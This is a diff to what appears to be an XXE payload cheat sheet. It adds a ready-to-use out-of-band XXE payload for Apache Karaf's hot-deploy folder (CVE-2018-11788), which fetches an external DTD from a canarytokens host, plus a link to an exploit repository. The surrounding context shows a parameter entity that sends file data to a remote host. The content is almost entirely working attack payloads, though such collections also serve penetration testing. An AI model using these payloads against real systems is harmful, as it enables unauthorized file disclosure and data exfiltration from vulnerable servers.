@@ -192,6 +192,26 @@ File stored on http://127.0.0.1/dtd.xml
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
 ```
 
+### XXE OOB with Apache Karaf "hot deploy" (CVE-2018-11788)
+
+Affected versions:
+
+- Apache Karaf <= 4.2.1
+- Apache Karaf <= 4.1.6
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
+<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
+    <feature name="deployer" version="2.0" install="auto">
+    </feature>
+</features>
+```
+
+Send the XML file to the `deploy` folder.
+
+Ref. [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)
 
 ## XXE in exotic files
 
